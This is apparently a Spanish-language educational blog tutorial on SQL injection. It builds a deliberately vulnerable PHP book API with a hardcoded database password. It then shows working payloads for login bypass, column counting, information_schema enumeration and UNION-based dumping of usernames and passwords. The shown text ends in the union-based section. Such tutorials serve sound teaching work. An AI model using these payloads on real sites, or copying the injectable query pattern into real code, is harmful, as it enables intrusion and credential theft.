---
id: "introduccion-a-inyeccion-sql"
title: "Introducción a Inyección SQL"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-14
updatedDate: 2022-02-14
image: "https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-0.webp"
description: "Guía completa sobre SQL Injection: fundamentos de SQL, tipos de inyecciones (Union-based, Error-based, Boolean-based, Time-based), técnicas de explotación y ejemplos prácticos con código."
categories:
  - "web"
draft: false
featured: false
lang: "es"
---

Las inyecciones SQL (SQLi) son un ataque muy común en aplicaciones web, consiste en inyectar comandos de SQL en las peticiones SQL legítimas que haga un servidor web a la base de datos.

Un ataque de este tipo puede derivar en cosas como:

- Obtener toda la información de las bases de datos
- Actualizar información de las bases de datos
- Eliminar información de las bases de datos
- Leer archivos del servidor
- Escribir archivos del servidor
- Ejecutar comandos

Y si, todo a partir de la inyección de código SQL.

Índice:

- [Fundamentos](#fundamentos)
- [SQL en Aplicaciones Web](#sql-en-aplicaciones-web)
- [Concepto de SQL Injection](#concepto-de-sql-injection)
- [In-band SQL Injection](#in-band-sql-injection)
    - [Union-based](#union-based)
    - [Error-based](#error-based)
- [Blind SQL Injection](#blind-sql-injection)
    - [Boolean-based](#boolean-based)
    - [Time-based](#time-based)
- [Out-of-Band](#out-of-band)
- [Conclusión](#conclusión)
- [Referencias](#referencias)

## Fundamentos

Antes de ver las diferentes técnicas de inyección SQL, debemos entender lo más básico, el propio SQL.

Primero de todo, SQL (Structured Query Language) es un lenguaje para la gestión de bases de datos. SQL permite definir, extraer y manipular datos de una base de datos.

Las sentencias SQL se suelen dividir en 5 tipos:

- DQL (Data Query Language) --> Contiene la instrucción SELECT.
- DML (Data Manipulation Language) --> Contiene instrucciones como INSERT, UPDATE o DELETE.
- DDL (Data Definition Language) --> Contiene instrucciones como CREATE, ALTER, DROP o TRUNCATE.
- DCL (Data Control Language) --> Contiene intrucciones como GRANT o REVOKE.
- TCL (Transaction Control Language) --> Contiene instrucciones como BEGIN, TRAN, COMMIT o ROLLBACK.

Todos los tipos de sentencias realmente no son muy relevantes sabérselas. Simplemente, está bien saber que existen estas diferenciaciones entre las distintas instrucciones de SQL. Mayoritariamente, las instrucciones que más nos puede interesar saber de cara a inyecciones SQL son las pertenecientes a los tipos DQL, DML y DCL, pero nunca hay que descartar ninguna porque puede que nos sea útil dependiendo de la situación en la que nos encontremos.

En este punto, ya sabemos que SQL es un lenguaje que nos permite construir sentencias, ya sea para manipular, definir o extraer datos de una base de datos. Ahora bien, ¿cómo se estructuran las bases de datos?.

Podemos distinguir dos tipos de bases de datos, las relacionales y las no relacionales, también conocidas como SQL y NoSQL. Las bases de datos relacionales (SQL) están basadas en tablas, mientras que las bases de datos no relacionales (NoSQL) pueden estar basadas en: documentos (estructura clave-valor), grafos, clave-valor o columnas.

De aquí con que te quedes con que existen estos dos tipos de bases de datos es suficiente, ya que no es objetivo de este post entrar en detalles de al menos, las bases de datos no relacionales (NoSQL).

Ahora bien, las que si vamos a ver más a fondo como se estructuran son las bases de datos relacionales, ya que son las bases de datos donde ocurre el SQL Injection.

Dentro de lo que son los dos modelos que hemos visto, SQL y NoSQL. Los encargados de llevar estos dos conceptos a la práctica son los llamados Gestores de Bases de Datos (DBMS). En concreto para las bases de datos relacionales, se encargan de llevarlo a la práctica los Gestores de Bases de Datos Relacionales (RDBMS).

Los RDBMS más famosos son:

- MySQL
- MariaDB
- MS SQL (Microsoft SQL)
- PostgreSQL
- Oracle

Pero no son los únicos.

Cada uno de estos gestores de bases de datos siguen el modelo de base de datos relacional, sin embargo, cada uno tiene sus características únicas que hacen que se diferencien entre los demás.

Todo esto que acabamos de ver se puede ver reflejado en el siguiente diagrama:

![Modelo de estructura de bases de datos relacionales](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-1.avif)

Con este diagrama podemos ver de forma mucho más clara la estructura de una base de datos y su posición en un gestor de bases de datos relacional.

Sabiendo esto, vamos a ver distintas sentencias SQL para familiarizarnos con el lenguaje y el procedimiento. Para ello, vamos a seguir el ejemplo de la imagen de arriba, todo se va a hacer como si nos encontrásemos dentro de la base de datos "webserver".

Sentencia básica:

- SELECT \* FROM users

Esta sentencia es la más básica y estaríamos diciendo lo siguiente: "Obtén todos los datos pertenecientes a la tabla users".

> Teniendo en cuenta que no tenemos que especificar base de datos porque ya nos encontramos dentro de ella (webserver)

Esta sentencia obtendría y daría como resultado lo siguiente:

![Resultado de SELECT * FROM users mostrando tabla completa](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-2.avif)

Otro ejemplo de sentencia sería:

- SELECT username, password FROM users WHERE id=1

Aquí ya hemos hecho unos cuantos cambios. Por ejemplo, ya no le estamos diciendo "Obtén todos los datos pertenecientes a la tabla users" sino que le estamos diciendo: "De la tabla users, obtén solo los resultados de la columna username y password".

Sin embargo, como vemos, luego le estamos colocando otra condición (WHERE id=1), aqui le estamos diciendo que solo devuelva los resultados que cumplan que el valor de la columna id sea igual a 1.

Entonces la query completa, sería: "De la tabla users, devuelveme solo los resultados de la columna username y password. Además, solo quiero que me devuelvas los resultados que cumplan que el valor de la columna id sea igual a 1".

El resultado sería:

![Resultado de SELECT con WHERE id=1 mostrando un solo usuario](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-3.avif)

Si la query en vez de ser:

- SELECT username, password FROM users WHERE id='1'

Fuese:

- SELECT username, password FROM users WHERE username="sikumy"

Daría el mismo resultado.

Podríamos resumir que la estructura de una sentencia básica sería:

- SELECT <columnas> FROM <tabla> WHERE <condicion>

A esta estructura, le podemos agregar otras instrucciones o cambiar alguna que otra cosa para que cambien un poco su comportamiento. Vamos a ver algunas de ellas:

- SELECT DISTINCT <columnas> FROM <tabla>

En este caso, la instrucción DISTINCT lo único que hace es eliminar los resultados duplicados, de forma, que solo se muestren 1 vez.

- SELECT "hola", "que", "tal", "???", "!!!" FROM <tabla>

La instrucción SELECT también permite definir valores constantes. De tal forma, que se muestren los valores constantes sea cual sea el contenido de la tabla. Por ejemplo, tenemos la siguiente tabla:

![Tabla de ejemplo con tres filas de datos](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-4.avif)

Si hacemos una petición como la escrita arriba, con valores constantes, el resultado será:

![Resultado de SELECT con valores constantes mostrando texto personalizado](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-5.avif)

Si nos fijamos, incluso da igual que pongamos más columnas de las que hay verdaderamente en la tabla. Ahora mismo quizas esta funcionalidad tiene poco sentido para ti, pero podremos ver un uso útil de cara al SQL Injection.

Otra instrucción útil y que veremos mejor su uso más adelante es LIMIT:

- SELECT <columnas> FROM <tabla> \[podríamos colocar el WHERE aquí en medio\] LIMIT <número>, <cantidad>

Esta instrucción básicamente te permite limitar los resultados de una query. Por ejemplo, volviendo y trayendo de nuevo esta tabla:

![Tabla de ejemplo con tres filas de datos](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-6.avif)

Sabiendo que esta sentencia devuelve todo el contenido de la tabla, en este caso, 3 filas. Podemos limitar los resultados con LIMIT. Ejemplo 1:

![Ejemplo de LIMIT 1,2 mostrando segunda y tercera fila](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-7.avif)

> OJO: Hay que tener en cuenta que LIMIT cuenta desde 0, es decir, 0 es el primer resultado, 1 el segundo, etc etc

Aquí le estamos diciendo: "Del resultado, vete a la posición 1 (el cual es la segunda fila de lo que devuelve porque cuenta desde 0) y limita desde esta posición a dos resultados".

Por eso mismo, el resultado que obtenemos es a partir de la segunda fila, y como hemos limitado los resultados a 2, pues nos muestra, la fila 2 y 3. Otro ejemplo:

![Ejemplo de LIMIT 0,2 mostrando primera y segunda fila](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-8.avif)

Aquí le decimos: "Oye, empieza desde la posición 0 (primera fila de lo que devuelve) y muéstrame desde esa posición una cantidad de 2 resultados". Por eso mismo, nos muestra la fila 1 y 2, pero no la 3.

Espero que se haya entendido esta última explicación 🥺. En cualquier caso, volveremos a verlo más adelante.

Por último, SQL también admite comentarios, estos se pueden declarar de dos formas distintas:

- #
- `--` (dos guiones seguidos de un espacio, se suele poner siempre `-- -` para que el espacio se haga notar)

Con esto, cualquier cosa que coloquemos después de alguno de estos símbolos, se ignorará, ya que se interpretará como un comentario. Ejemplo:

![Ejemplo de comentarios en SQL usando # y --](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-9.avif)

A pesar de poner cosas sin sentidos y no válidas, al estar colocadas después de los símbolos de comentarios pues no pasa nada. Esto nos será útil de cara al SQL Injection.

Habiendo visto toda esta introducción a SQL. Vamos a ver su implementación en Aplicaciones Web.

## SQL en Aplicaciones Web

Ya conocemos los fundamentos de SQL, ahora bien, vamos a ver como se conecta una base de datos a una aplicación web. El código que vamos a usar en este post es el siguiente:

```php
<?php

// Datos
$dbhostname = 'localhost';
$dbuser = 'root';
$dbpassword = 'sikumy123$!';
$dbname = 'webserver';

//Crear conexion
$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);

//Comprobar si la conexion se ha hecho correctamente
if (!$connection) {
    echo mysqli_error($connection);
    die();
}

// Parametro de id del Libro
$input= $_GET['id'];

// Query a MySQL
$query = "SELECT title, author, year_publication FROM books WHERE id=$input";

// Realizar query
$results = mysqli_query($connection, $query);

// Comprobar si la query se ha hecho correctamente
if (!$results) {
    echo mysqli_error($connection);
    die();
}

echo "<h1>API de tu librería de confianza</h1>";

// Obtener y mostrar resultados de la query. Los resultados se almacenan en un array por el cual iteramos
while ($rows = mysqli_fetch_assoc($results)) {

    echo '<b>Título: </b>' . $rows['title'];
    echo "<br />";
    echo '<b>Autor: </b>' . $rows['author'];
    echo "<br />";
    echo '<b>Año de Publicación: </b>' . $rows['year_publication'];
    echo "<br />";

}

?>
```

Vamos a descomponer esto por partes para explicarlo.

Lo primero de todo es establecer la configuración, dicho de otra forma, los datos necesarios para que la aplicación web pueda conectarse a la base de datos con éxito. En este caso, se define al principio del archivo:

![Código PHP con variables de configuración de base de datos](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-10.avif)

Después de esta definición, debemos de conectarnos a la base de datos usando estos datos:

![Código PHP estableciendo conexión a base de datos con mysqli_connect](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-11.avif)

Si la conexión es exitosa, el código PHP seguirá con el resto del código, si no, parará.

Una vez se ha establecido la conexión con el gestor de base de datos y la base de datos, es hora de declarar la query que se hará:

![Código PHP definiendo query SQL con parámetro GET](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-12.avif)

En este caso, habrá un valor dinámico que estableceremos a través de una petición GET en el servidor web. Este valor filtrará la query por el campo id.

Hasta aquí ya hemos establecido lo principal para conectar una aplicación web con una base de datos:

- Hemos definido los datos necesarios para la conexión
- Hemos realizado la conexión con éxito
- Hemos realizado la query

Ya por último simplemente toca mostrar los resultados de la query, en este caso lo haremos de la siguiente forma:

![Código PHP mostrando resultados con bucle while](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-13.avif)

Realizamos un bucle el cual iterará por la variable $results. Esta variable es un array que contiene los distintos resultados devueltos por la query hecha anteriormente.

Por lo que dentro del bucle, simplemente mostramos los resultados, filtrando por columna para mostrar cada resultado en su lugar correspondiente.

El resultado visual de todo este código es el siguiente:

![API mostrando información de un libro con título, autor y año](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-14.avif)

> Ojo, aquí ya tengo definidas varias cosas, como puede ser la base de datos, la tabla correspondiente y las columnas con sus datos. En el caso de que quieras montártelo en local con el código que dejé arriba, tienes dos opciones.
> 
> 1\. Crear todo con los mismos nombres de base de datos, tabla y columnas (los datos pues sí que lo puedes rellenar con lo que quieras).
> 
> 2\. Adaptar el código a algo que ya tengas o algo distinto.

Esta manera que hemos visto es una posible forma de conectar una aplicación web a una base de datos. Sin embargo, no es la única (y seguramente quizás tampoco la mejor, perdonadme developers 😢).

## Concepto de SQL Injection

Ya hemos visto los fundamentos suficientes como para poder llegar a entender el SQL Injection. Ahora vamos a ver la idea base de todos los ataques de este tipo.

Siguiendo el laboratorio que nos hemos ido montando a lo largo de este post, hemos llegado a lo siguiente:

![API mostrando información de un libro con título, autor y año](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-15.avif)

En este caso, sabemos que la sentencia SQL que se ejecuta por detrás en el parámetro id es la siguiente:

- SELECT title, author, year\_publication FROM books WHERE id=<valor que controlamos>

En la imagen de arriba, la sentencia ejecutada por detrás sería:

- SELECT title, author, year\_publication FROM books WHERE id=1

En este caso, no se está haciendo ningún tipo de sanitización, por lo que, que ocurre si además del 1 o el número que sea, colocamos una sentencia SQL.

Es decir, por ejemplo, la siguiente sentencia:

- SELECT title, author, year\_publication FROM books WHERE id=1 and 2=1-- -

Aquí le estamos añadiendo una condición. De por sí, originalmente si se coloca un identificador que existe, como puede ser el 1, pues nos devolverá los resultados relacionados a este id (como vemos en la imagen). Sin embargo, ahora le estamos añadiendo que además de esto, se tiene que cumplir la condición 2=1, cosa que siempre dará como resultado FALSE.

Como estas dos condiciones (la de que el id exista, y la del 2=1) están unidas por un operador AND, para que la query devuelva un resultado, ambas condiciones deben ser verdad. La segunda ya sabemos que siempre dará FALSE, por lo que el servidor no debe de devolver ningún resultado si lanzamos esa query.

> OJO, no debe de devolver ningún resultado suponiendo que haya un SQL Injection. Que, a ver, en este caso, sabemos que lo hay. Pero, en cualquier otro caso, podríamos confirmarlo de esta forma.

![API sin resultados al usar condición falsa AND 2=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-16.avif)

No nos devuelve nada, por lo que está ocurriendo exactamente lo que estamos diciendo arriba. De la misma forma, si cambiamos la query a:

- SELECT title, author, year\_publication FROM books WHERE id=1 and 1=1-- -

Ahora si estamos colocando una condición TRUE. Estamos haciendo que el resultado de ambas condiciones también lo sea, por lo que:

![API mostrando resultados al usar condición verdadera AND 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-17.avif)

En este caso, ahora el servidor si que devuelve resultados. En un ejemplo real, esto nos podría servir para analizar la existencia del SQL Injection analizando las respuestas del servidor basándonos en las condiciones que proporcionamos.

La forma más típica de detectar un SQL Injection es poniendo una comilla y comprobar si el servidor devuelve algún tipo de error en la respuesta:

![Error SQL mostrado al inyectar comilla simple](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-18.avif)

Sin embargo, puede darse el caso donde el servidor no devuelva errores, por lo que la opción de analizar la respuesta del servidor en base a condicionales es una buena opción.

> NOTA: Como vemos, además de la condición como tal que hemos añadido (1=1 o 2=1), después de esto estamos añadiendo la instrucción de comentario en SQL.
> 
> En este caso, realmente no haría falta colocarlo, ya que sabemos que en la sentencia SQL que se ejecuta, después del valor ID, no hay más sentencia SQL. Pero en un caso real, nosotros no vamos a saber que sentencia se estará ejecutando por detrás, por lo que lo mejor es acostumbrarse a colocar el símbolo de comentario siempre que lidiemos con un SQL Injection para conseguir que todo lo demás se ignore y nuestro input sea el final de la sentencia.

> Volviendo a las condiciones, aquí algo curioso a comentar es que el operador AND siempre es validado antes que el operador OR.
> 
> ¿Qué significa esto?

Pues, por ejemplo, imaginémonos la siguiente sentencia:

- SELECT \* FROM logins WHERE username="<INPUT>" AND password="<INPUT>"

Esta sentencia pertenece a un login, con esto, que ocurre si nosotros introducimos X datos en el campo de username y en password de tal manera que los valores sean los siguientes:

![Inyección SQL en campo username con OR 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-19.avif)

La sentencia que ejecutará el servidor para validar si los datos son ciertos será:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1" AND password="ni\_idea\_de\_cual\_es"

Aquí, al igual que en el ejemplo anterior, estamos introduciendo una condición. Sin embargo, vamos a analizar su comportamiento teniendo en cuenta lo mencionado arriba sobre el AND y el OR y dando por hecho de que el usuario admin SI existe:

![Diagrama de lógica condicional SQL con AND y OR](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-20.avif)

Este básicamente sería el comportamiento de una sentencia cuando se mezclan operadores como el AND y el OR. En este caso, por ejemplo, conseguiríamos iniciar sesión como el usuario admin sin saber su contraseña, ya que, el valor resultante de todas las condiciones es TRUE y el usuario admin existe.

Ahora bien, ¿qué ocurre si la condición en vez de inyectarla en el campo username, lo hacemos en el campo password?

![Inyección SQL en campo password con OR 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-21.avif)

El comportamiento sería el siguiente:

![Diagrama de lógica SQL inyectando en campo password](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-22.avif)

En este caso, sea cual sea el usuario o la contraseña, aunque ambos sean incorrectos, la sentencia devolverá TRUE. ¿Cómo se comportaría la aplicación ante esto?, ya que, es TRUE, pero la query devolverá todos los resultados de la tabla, ¿con quien se iniciaría la sesión?.

Pues normalmente, la lógica que seguiría la aplicación ante este caso sería iniciar sesión con el usuario del primer resultado, dicho de otra forma, con el usuario de la primera fila de toda la tabla. El cual en muchas ocasiones suele ser el administrador.

De estas dos formas que hemos visto, conseguiríamos aprovecharnos del SQL Injection para, en ambas, llegar a iniciar sesión sin conocer credenciales al estar aprovechándonos de la lógica de las condiciones y su manipulación.

> Con todo esto que acabamos de ver ya puedes llegar a entender la típica camiseta de SQL Injection:

Por último, anteriormente mencionamos que el uso de un comentario, hará que todo lo que haya después de este se trate como tal. Por lo que, supongamos que tenemos la siguiente sentencia que hemos visto arriba:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1" AND password="ni\_idea\_de\_cual\_es"

Si añadimos lo siguiente:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1"#" AND password="ni\_idea\_de\_cual\_es"

> También podríamos haber usado: `-- -`

Hará que toda esta parte se ignore:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1"#" AND password="ni\_idea\_de\_cual\_es"

Y, por lo tanto, la sentencia que se ejecutará, será:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1"#

Esta sería una demostración de porque siempre deberíamos de colocar instrucciones de comentarios en nuestras inyecciones.

![Meme de STOP antes de continuar](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-23.avif)

STOPPPP. Antes de seguir, vamos a hacer una minirecopilación de lo que llevamos:

- Hemos visto la introducción a SQL y como está relacionado con los gestores de bases de datos y los tipos de bases de datos que hay.
- A su vez, hemos visto la estructura de las bases de datos relacionales. Para que así podamos entender como está montado todo y en que forma se almacena la información.
- Para familiarizarnos un poco con SQL, hemos visto algunas instrucciones y sentencias del lenguaje.
- Posterior a todo esto, hemos visto un ejemplo de conexión entre aplicación web y base de datos.
- Con toda esta base, nos hemos introducido en el SQL Injection viendo algunos conceptos básicos y situaciones.

Habiendo visto todo esto, ya es hora de introducirnos a ejemplos un poco más avanzados y los tipos de SQL Injection que hay. El siguiente diagrama resume los tipos de técnicas y SQLi que existen:

![Diagrama de tipos de SQL Injection: In-band, Inferential y Out-of-band](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-24.avif)

Vamos a ir viéndolos todos uno por uno.

## In-band SQL Injection

Este tipo de SQLi es el más básico y sencillo de todos. Ya que, cuando nos referimos a "In-band" quiere decir que somos capaces de ver la respuesta de la base de datos en la respuesta del servidor. Dentro de este tipo, encontramos dos subtipos, las inyecciones basadas en Error y en Union.

##### Union-based

Dentro de SQL tenemos la instrucción UNION. Esta instrucción permite unir los resultados de distintas instrucciones SELECT. Un ejemplo de sentencia con esta instrucción sería la siguiente:

- SELECT columna1, columna2 FROM tabla1 UNION SELECT columna1,columna2 FROM tabla2;

A nivel visual, esta instrucción uniría los resultados de la siguiente forma:

![Diagrama visual de cómo funciona UNION en SQL](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-25.avif)

Aquí hay algunos detalles a tener en cuenta con esta instrucción:

- Cuando realizamos una unión entre dos SELECT, ambos deben de tener el mismo número de columnas (no en la tabla como tal, sino columnas seleccionadas en la query).
- Al mismo tiempo, cada columna debe coincidir en el tipo de dato, es decir, en el caso de arriba, el tipo de dato de la columna 1 de la tabla 1, debe ser el mismo que el de la columna 1 de la tabla 2. Para que al momento de apilarlas como vemos arriba, no haya errores.
    - Ojo, de las columnas seleccionadas, no de las columnas originales, ¿a qué me refiero con esto?. Si la query hubiera sido por ejemplo:
        - SELECT columna1, columna2 FROM tabla1 UNION SELECT columna3,columna4 FROM tabla2;
    - El tipo de dato de la columna1 debe de ser el mismo que el de la columna3. De la misma forma, el de la columna2 debe ser el mismo que el de la columna4 y etc etc... .
- De por sí, la instrucción UNION elimina los duplicados, por lo que si no queremos que ocurra esto simplemente en vez de usar UNION, usamos UNION ALL.

Conociendo ya esta instrucción vamos a ver como podemos aprovecharnos de ella para obtener información de la base de datos.

Teniendo en cuenta los requisitos para poder usar la instrucción UNION, nuestra primera tarea es comprobar cuantas columnas tiene la sentencia que se está ejecutando por detrás. Esto se puede comprobar de dos formas, con la propia instrucción UNION o usando ORDER BY. Vamos a hacerlo de ambas:

- ORDER BY

La instrucción ORDER BY sirve para ordenar el resultado de una sentencia por la columna que queramos. Se especifica la columna mediante el número que le corresponda, la columna más a la izquierda es la 1, la siguiente la 2, y así... .

Por lo que, la idea es colocar en el campo id lo siguiente:

- 1 ORDER BY <número por el que iremos iterando>#

> De nuevo, la instrucción del comentario aunque en este caso no haga falta. La coloco para acostumbrarnos a ponerla siempre.

![Resultado exitoso con ORDER BY 1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-26.avif)

![Resultado exitoso con ORDER BY 2](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-27.avif)

![Resultado exitoso con ORDER BY 3](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-28.avif)

Vemos que mientras la columna por la que le estamos diciendo que ordene, exista, el servidor no dará ningún problema en la respuesta. Sin embargo, cuando lleguemos al punto de que la columna por la que decimos que ordene, no exista, ocurrirá lo siguiente:

![Error con ORDER BY 4 indicando columna desconocida](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-29.avif)

De esta forma, confirmamos que la sentencia SQL que se ejecuta por detrás tiene 3 columnas. Sabiendo esto, ya procederíamos a usar UNION (más adelante veremos que hacer llegados a este punto).

> En este ejemplo, la respuesta del servidor es super evidente. Sin embargo, en otros casos, puede que sea menos susceptible el error. Es tarea nuestra analizar el comportamiento del servidor.

- UNION

Ahora, vamos a hacer lo mismo pero usando la propia instrucción UNION. La idea es la siguiente:

- UNION SELECT <ir iterando hasta llegar al número correcto>#

En este caso, para enumerar el número de columnas nos vamos a aprovechar del propio requisito de la instrucción UNION:

> Ambos SELECT que se unan deben de tener exactamente el mismo número de columnas

Teniendo en cuenta esto, si yo hago por ejemplo lo siguiente:

![Error al usar UNION SELECT con una sola columna](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-30.avif)

Nos saltará el error correspondiente a lo que hemos explicado.

> Nota: He colocado la palabra null porque como literalmente significa "nulo" nos servirá independientemente del tipo de dato, ya que null es admitido por todos. De esta forma no nos tenemos que preocupar por si lo que estamos poniendo es un integer (número), un string o lo que sea.
> 
> También, por aclarar, colocar null no es lo mismo que "null", ya que en el segundo sí que estamos diciendo explícitamente que es un string

Sabiendo esto, ya es cuestión de ir colocando columnas en nuestro SELECT hasta que el número de columnas de ambos SELECT coincidan:

![Error al usar UNION SELECT con dos columnas](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-31.avif)

![UNION SELECT exitoso con tres columnas mostrando null](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-32.avif)

Ojo, aquí vemos como ahora si coinciden las columnas por la respuesta por parte del servidor. Además, vemos como presuntamente se nos muestra lo que hemos colocado en nuestro SELECT. Podemos confirmar esto haciendo esto:

![UNION SELECT mostrando valores de texto personalizados](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-33.avif)

> No nos da fallo, porque las tres columnas del primer SELECT coinciden en tener un tipo de dato que admite strings, sino fuera el caso pues no funcionaría esto último. Tendríamos que ir probando a poner números o lo que sea hasta que el servidor nos lo devolviese en la respuesta.

Y de esta forma es como enumeraríamos el número de columnas de la sentencia SQL.

Ahora, volviendo al tema principal, ¿cómo podemos aprovecharnos de la instrucción UNION para obtener toda la información que queramos de la base de datos?

Pues es sencillo. Yo, por ejemplo, dentro de la misma base de datos donde está la información de los libros, he creado una tabla llamada users, la cual contiene usuarios y contraseñas:

![Tabla users con columnas user y password](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-34.avif)

Sabiendo esto, podemos hacer una query como la siguiente:

- 1 UNION SELECT user, password, null FROM users#

![UNION SELECT extrayendo usuarios y contraseñas de tabla users](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-35.avif)

De esta forma, conseguimos dumpearnos todos los datos.

> La forma en la que se mostrarán los datos o la cantidad de datos que se muestren dependerá de como esté montado todo. Si por ejemplo, aquí solo nos mostrasen un resultado, podríamos ir moviéndonos por los distintos resultados usando la instrucción LIMIT.

Ahora bien, aquí puedes decir: "Si claro, pero esto lo puedes hacer porque sabes previamente que hay una tabla llamada users con esas columnas y demás".

Y es cierto. ¿Cómo procederíamos ante un caso donde no sabemos absolutamente nada de la base de datos?

Pues esto va a depender del gestor de base de datos que se esté usando. La cuestión es que todos los gestores tienen ciertas bases de datos por defecto que almacenan información del resto de bases de datos.

![Base de datos information_schema en MariaDB](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-36.avif)

Para que se vea esto de forma más clara, vamos a ver como se llevaría a cabo en MariaDB (sería de la misma forma en MySQL, ya que son gestores casi iguales).

Vamos a partir de que ya conocemos el número de columnas y podemos usar la instrucción UNION sin problemas. Con esto hecho, lo primero que vamos a enumerar son las bases de datos. Para ello, vamos a usar la siguiente sentencia en el parámetro id:

- 1 UNION SELECT null, schema\_name, null FROM information\_schema.schemata#

![Enumeración de bases de datos usando information_schema.schemata](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-37.avif)

Como vemos, se nos lista todas las bases de datos del gestor. Esto es porque la columna schema\_name en la tabla schemata de la base de datos information\_schema almacena esta información

En el caso de que tuvieramos la limitación de que solo se nos muestra un resultado, pues se hace lo que ya se ha dicho, ir iterando usando LIMIT:

![Uso de LIMIT para enumerar bases de datos una por una](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-38.avif)

Ya conocemos las bases de datos existentes. Digamos que yo al verlo, descarto de por sí:

- information\_schema
- perfomance\_schema
- mysql

Ya que son bases de datos por defecto del gestor.

Por lo que ponemos el punto de mira en la base de datos con nombre "webserver". Con esta información, procedemos con la siguiente sentencia:

- 1 UNION SELECT null, table\_name, table\_schema FROM information\_schema.tables WHERE table\_schema="webserver"#

![Enumeración de tablas de la base de datos webserver](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-39.avif)

Como vemos, se nos lista todas las tablas pertenecientes a la base de datos webserver (de la misma forma, nos lista a que base de datos pertenece las tablas). En este caso, nosotros viendo esto, la tabla que más nos llama la atención es users, por lo que, ahora, debemos de enumerar las columnas de esta tabla:

- 1 UNION SELECT column\_name, table\_name, table\_schema FROM information\_schema.columns WHERE table\_name="users" and table\_schema="webserver"#

![Enumeración de columnas de la tabla users](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-40.avif)

De esta forma, acabamos de enumerar:

- Todas las bases de datos
- Las tablas de la base de datos webserver
- Las columnas de la tabla users de la base de datos webserver

Teniendo ya esta información, podemos hacer lo mismo que hicimos al principio:

![Extracción final de usuarios y contraseñas usando UNION](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-41.avif)

Un tip a mencionar aquí es que quizas, se puede dar el caso donde se nos muestre en la respuesta del servidor solo el resultado de una columna. Y quizás para obtener información como usuario:contraseña puede ser un poco coñazo. Por lo que en este tipo de situaciones podemos hacer uso de la función CONCAT():

![Uso de CONCAT para combinar usuario y contraseña en una sola columna](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-42.avif)

> 0x3a son los dos puntos (:) en hexadecimal. También podríamos haberlo puesto como ":"

